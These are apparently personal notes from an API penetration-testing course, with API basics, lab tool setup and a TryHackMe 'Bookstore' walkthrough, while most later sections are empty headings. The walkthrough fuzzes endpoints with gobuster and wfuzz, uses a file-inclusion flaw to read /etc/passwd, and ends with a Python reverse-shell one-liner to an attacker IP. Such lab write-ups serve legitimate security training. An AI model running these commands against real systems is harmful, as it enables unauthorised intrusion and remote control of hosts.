!!! info ""

    ### Introduction

    API Application Programming Interface
    
    ![/Knowledge_Base/images/tcm_api_intro_1](/Knowledge_Base/images/tcm_api_intro_1.png)

    #### Interacting with APIs
    API to play with [https://catfact.ninja/](https://catfact.ninja/)
    ![/Knowledge_Base/images/tcm_api_intro_2](/Knowledge_Base/images/tcm_api_intro_2.png)
    
    To call API and get a fact [https://catfact.ninja/fact](https://catfact.ninja/fact)

    The API get /fact has a Parameter that we can test
    ![/Knowledge_Base/images/tcm_api_intro_3](/Knowledge_Base/images/tcm_api_intro_3.png)
    [](https://catfact.ninja/fact/)]

    Test the Parameter [https://catfact.ninja/fact?max_length=50](https://catfact.ninja/fact?max_length=50)


    #### API Types
    - REST (Client Server Arch., Stateless, uses HTTP methods)
    - Public
    - Partner (shared between a number of companies)
    - Private (used in a single Organization)

    #### HTTP Methods
    - Get
    - Head
    - Post
    - Delete


!!! info "" 

    ### Lab Setup

    - pimpmykali
        
        To easily install the required tools (such as docker-compose) and crAPI lab, simply clone this repository and run it with the option "O".

        ```bash
        git clone https://github.com/Dewalt-arch/pimpmykali
        ./pimpmykali.sh O
        ```

    - postman https://www.postman.com/downloads/

    - Burp Suite https://portswigger.net/burp/communitydownload
      - FoxyProxy extension for Firefox


!!! info "" 

    ### Enumerating APIs

    #### Fuzzing APIs

    !!! example ""
    
        https://tryhackme.com/r/room/bookstoreoc

        nmap the IP will show up port 5000 and robots.txt
        ![/Knowledge_Base/images/tcm_api_fuzz_1](/Knowledge_Base/images/tcm_api_fuzz_1.png)

        robots.txt doesn't want bots scanning api
        ![/Knowledge_Base/images/tcm_api_fuzz_2](/Knowledge_Base/images/tcm_api_fuzz_2.png)

        Fuzzing

        ```bash
        gobuster dir -u http://10.10.139.243:5000/ -w /usr/share/wordlists/dirb/big.txt -t 60
        ```

        ![alt text](/Knowledge_Base/images/tcm_api_fuzz_156.png)

        Now if I visit http://10.10.139.243:5000/console I see the below
        
        ![alt text](/Knowledge_Base/images/tcm_api_fuzz_-1.png)



        we visit that api path and we get this
        so now we know how to use the api
        ![/Knowledge_Base/images/tcm_api_fuzz_3](/Knowledge_Base/images/tcm_api_fuzz_3.png)
        
        keep in mind if you see v2, version numbers, check if maybe there is v1, v3, etc.
        Try different types of values for input.
        Try enumerating the API

        ```bash
        GET /api/v3/resources/books?published=%27 HTTP/1.1
        ```
        
        we can enumerate in place of ```published``` and the value as it as well
        Below will return only status 200 ok

        ```bash
        wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --sc 200 'http://10.10.121.118:5000/api/v2/resources/books?FUZZ=%27'

        #trying v1

        wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --sc 200 'http://10.10.121.118:5000/api/v1/resources/books?FUZZ=%27'
        ```

        I am having an issue with the lab, i rebooted the target machine but none of the scans are showing me the show result, anyways, I snatched teh shot from somewhere online.
        ![alt text](/Knowledge_Base/images/tcm_api_fuzz_-7.png)

        ![alt text](/Knowledge_Base/images/tcm_api_fuzz_-2.png)

        Seems like we have LFI, checking ```/etc/passwd```

        ![alt text](/Knowledge_Base/images/tcm_api_fuzz_-8.png)

        Checking users list and locating target user
        ![alt text](/Knowledge_Base/images/tcm_api_fuzz_-9.png)

        ![alt text](/Knowledge_Base/images/tcm_api_fuzz_-5.png)

        Now we can try out that pin from above in the interactive console, yup it worked!
        ![alt text](/Knowledge_Base/images/tcm_api_fuzz_-6.png)

        https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting/
        
        ```python
        __import__('os').popen('bash -c "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"').read()
        ```







    #### Discovery via Source code




!!! info "" 

    ### Attacking Authorization




!!! info "" 

    ### Attacking Authentication




!!! info "" 

    ### Injection



!!! info "" 

    ### Mid-course Capstone







!!! info "" 

    ### Mass Assignment




!!! info "" 

    ### Excessive Data Exposure




!!! info "" 

    ### SSRF - Server-side Request Forgery



!!! info "" 

    ### Chaining Vulnerabilities



!!! info "" 

    ### Final Capstone

!!! info ""

    ### Resources

    [exploit-notes.hdks](https://exploit-notes.hdks.org/exploit/web/api/)

